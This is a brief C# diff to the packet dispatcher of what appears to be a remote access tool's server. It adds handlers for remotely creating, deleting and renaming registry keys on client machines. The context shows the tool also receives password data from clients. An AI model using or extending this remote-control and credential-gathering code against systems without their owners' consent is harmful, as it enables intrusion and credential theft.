@@ -70,6 +70,18 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleLoadRegistryKey((ClientPackets.GetRegistryKeysResponse)packet, client);
             }
+            else if (type == typeof(ClientPackets.GetCreateRegistryKeyResponse))
+            {
+                CommandHandler.HandleCreateRegistryKey((ClientPackets.GetCreateRegistryKeyResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetDeleteRegistryKeyResponse))
+            {
+                CommandHandler.HandleDeleteRegistryKey((ClientPackets.GetDeleteRegistryKeyResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetRenameRegistryKeyResponse))
+            {
+                CommandHandler.HandleRenameRegistryKey((ClientPackets.GetRenameRegistryKeyResponse)packet, client);
+            }
             else if (type == typeof(ClientPackets.GetPasswordsResponse))
             {
                 CommandHandler.HandleGetPasswordsResponse(client, (ClientPackets.GetPasswordsResponse)packet);
